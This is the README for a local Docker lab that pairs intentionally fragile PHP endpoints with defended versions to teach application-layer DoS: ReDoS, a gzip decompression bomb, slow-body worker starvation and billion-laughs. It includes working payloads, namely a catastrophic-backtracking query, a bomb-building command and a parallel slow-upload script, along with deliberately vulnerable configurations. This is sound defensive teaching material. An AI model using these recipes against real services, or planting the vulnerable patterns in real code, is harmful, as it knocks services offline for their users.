# dos-basic

Companion lab for the TechEarl [application-layer DoS](https://techearl.com/application-layer-dos) spoke article. A small PHP + Apache app with three intentionally resource-fragile endpoints, each demonstrating a distinct L7 DoS class, paired with a defended sibling that shows the mitigation. A fourth endpoint covers the XML billion-laughs case where libxml's default already mitigates.

## SAFETY — read this first, every time

**This lab is for testing your OWN system's resilience and understanding the attack mechanics. It exists to be run against the local container that ships with it, and nothing else.**

- The lab binds to `127.0.0.1:8092` by default. Do not change that binding. Do not expose it through a tunnel, a reverse proxy, a public hostname, ngrok, or any other forwarder. Do not run it on a shared machine.
- Aiming any of the payloads documented in this README at a host you do not own and do not have explicit written authorisation to test is a **federal-felony-level offence** in the United States (Computer Fraud and Abuse Act, 18 USC 1030), the United Kingdom (Computer Misuse Act 1990, sections 1 and 3), Australia (Criminal Code Act 1995, Part 10.7), the European Union (Directive 2013/40/EU as transposed in member states), and every other jurisdiction I am aware of. Knocking a third-party service offline, even briefly, even "to prove a point", is a prosecutable crime. There is no grey area.
- This lab is framed as a defender's resilience exercise. Read it that way. The whole reason each payload sits next to a defended sibling is so you can verify that **your** mitigations work against **your** lab before they are ever needed in production.
- The Docker container has `mem_limit=512m`, `cpus=1.0`, and `pids_limit=200` set in the compose snippet so a runaway payload cannot kill the host. Do not remove those limits.
- Tear down with `docker compose down` when you are done. Anything written into the container goes with it.

If you are not 100 percent clear on the legal line, the answer is: only ever fire these payloads at this container, on this machine, with this binding. That is the only safe configuration.

## Endpoints

| Endpoint | Method | Class | Defended sibling |
|---|---|---|---|
| `/search.php?q=<v>` | GET | ReDoS via `preg_match('/^(a+)+$/', $q)` | `/defended/search.php` |
| `/upload.php` | POST raw gzip body | Decompression bomb via `gzdecode` with no size guard | `/defended/upload.php` |
| `/slow.php` | POST body | Slow-body / RUDY: server waits for the full upload, default Apache `Timeout` 60s | `/defended/slow.php` |
| `/billion-laughs.php` | POST `xml` | XML entity expansion — libxml default already mitigates; the page demonstrates both states | (mitigation demo) |

## Running

```bash
docker compose up dos-basic
```

From the root of the `techearl-labs` repo. The lab listens on `http://localhost:8092`. The landing page at `/` lists every endpoint.

## Expected payload paths

### 1. ReDoS: `/search.php`

The endpoint runs `preg_match('/^(a+)+$/', $_GET['q'])`. Nested quantifiers force catastrophic backtracking on input shaped like `aaaa...a!` — the trailing `!` guarantees the match fails, and the engine has to try every partition of the leading `a`s between the inner and outer group before giving up.

```bash
time curl 'http://localhost:8092/search.php?q=aaaaaaaaaaaaaaaaaaaaaa!'
```

Twenty-two `a`s typically returns in around half a second on one CPU core. Each additional `a` roughly doubles the runtime: 24 around 2.5 seconds, 26 around 8 seconds, 28 around 35 seconds. The request is fifty bytes.

The endpoint disables PCRE JIT and raises `pcre.backtrack_limit` and `pcre.recursion_limit` to 1e9. PHP's defaults (JIT on, 1M backtrack limit) would short-circuit the demo; many real shops have flipped one or both of those after hitting an unrelated bug, and the article uses that to explain why the catastrophic shape is still alive in 2026.

The defended sibling caps input length at 64 bytes, drops the nested quantifier (`/^a+$/`), and pins PHP's `pcre.backtrack_limit` to 100000 so even a future bad-pattern regression bails before it burns a second of CPU:

```bash
time curl 'http://localhost:8092/defended/search.php?q=aaaaaaaaaaaaaaaaaaaaaa!'
```

Returns in microseconds.

### 2. Decompression bomb: `/upload.php`

The endpoint reads `php://input` and calls `gzdecode` with no size guard. Build a bomb (a 1 GB block of zeroes compresses to about 1 MB of gzip):

```bash
dd if=/dev/zero bs=1M count=1024 status=none | gzip -9 > /tmp/bomb.gz
ls -lh /tmp/bomb.gz
# Around 1 MB.

curl -sS --data-binary @/tmp/bomb.gz http://localhost:8092/upload.php
```

PHP `memory_limit` is set to 256M in this lab (and the container has `mem_limit=512m`), so the vulnerable endpoint will be killed by the memory limit before it eats a real host gigabyte. That is the lab safety net. The article's point is that a production host without `memory_limit`, or with a 4 GB limit set defensively, gets crushed instead.

The defended sibling streams the inflate through `inflate_init` + `inflate_add` in 8 KB chunks, refuses any compressed payload above 1 MB, and bails the moment inflated output crosses 10 MB:

```bash
curl -sS --data-binary @/tmp/bomb.gz http://localhost:8092/defended/upload.php
# Returns a "Refused: decompressed output exceeds ..." message in milliseconds.
```

### 3. Slow body: `/slow.php`

The vulnerable endpoint calls `file_get_contents('php://input')` with no PHP-level cap. The lab disables Apache's `mod_reqtimeout` (which would normally enforce `body=10,MinRate=500`) and sets `Timeout 300`, so a client streaming bytes one at a time can hold a worker for five minutes. The lab is also configured with `MaxRequestWorkers=6`, so six concurrent slow uploaders saturate the pool.

Use a Python helper to write a slow body to stdout, then pipe it through curl with chunked transfer encoding (curl's `--limit-rate` slows both directions, which obscures the result; chunked + a slow stdin source is the right shape):

```bash
cat > /tmp/slowpipe.py <<'EOF'
import sys, time
n = int(sys.argv[1]); rate = int(sys.argv[2])
chunk = max(1, rate // 10); delay = chunk / rate
written = 0
while written < n:
    w = min(chunk, n - written)
    sys.stdout.buffer.write(b'a' * w); sys.stdout.buffer.flush()
    written += w; time.sleep(delay)
EOF

# Launch six slow uploaders in parallel: 3000 bytes at 50 B/s each.
for i in 1 2 3 4 5 6; do
  ( python3 /tmp/slowpipe.py 3000 50 | curl -sS --max-time 120 -X POST \
      -H 'Content-Type: application/octet-stream' \
      -H 'Transfer-Encoding: chunked' -H 'Expect:' --no-buffer -T - \
      http://localhost:8092/slow.php -o /dev/null ) &
done
sleep 8

# Worker scoreboard should show all 6 in W (writing reply to slow client).
docker exec dos-basic curl -sS http://127.0.0.1/server-status?auto \
    | grep -E '^(BusyWorkers|IdleWorkers|Scoreboard)'

# A normal request hangs while workers are starved.
time curl -sS http://localhost:8092/ -o /dev/null
```

In testing, the seventh request waited around 48 seconds to be served (until one of the six slow uploads completed), while `BusyWorkers: 6` and the scoreboard read `WKKKKW`. That is the demonstration: one host with six trivial connections held a six-worker pool hostage for the duration.

The defended sibling lives at `/defended/slow.php`. The honest story there: under `mod_php` Apache buffers the body before invoking PHP, so a PHP-level `stream_set_timeout` on `php://input` cannot fire. The real fix is `RequestReadTimeout header=20-40,MinRate=500 body=10,MinRate=500` in Apache config (this lab disables it on purpose so the vulnerable demo works; in production keep it on). The defended endpoint enforces a `Content-Length` and body-size cap of 1 MB plus an 8-second execution deadline as the second line of defence, which is the part that fires on PHP-FPM / Swoole / ReactPHP stacks where `php://input` actually streams.

### 4. Billion laughs: `/billion-laughs.php` (mitigation demo)

libxml 2.9.0+ disables entity substitution by default. `simplexml_load_string` with no extra flags refuses to expand `&lol5;` even when the DTD declares it. The page lets you toggle the `LIBXML_NOENT` flag and watch the parsed text balloon from 0 bytes to 100000 when entity substitution is turned on.

The article cross-links to the [billion laughs attack](https://techearl.com/billion-laughs-attack) spoke for the wider XML / XXE coverage.

## Resource limits

The container is constrained in the compose snippet so a runaway payload cannot starve the host:

```yaml
mem_limit: 512m
memswap_limit: 512m
cpus: 1.0
pids_limit: 200
```

PHP also has `memory_limit=256M` and `max_execution_time=60` so any single request is bounded independently. Do not remove these without replacing them with something stricter.

## Tearing down

```bash
docker compose down
```

No named volumes, so nothing persists between runs.
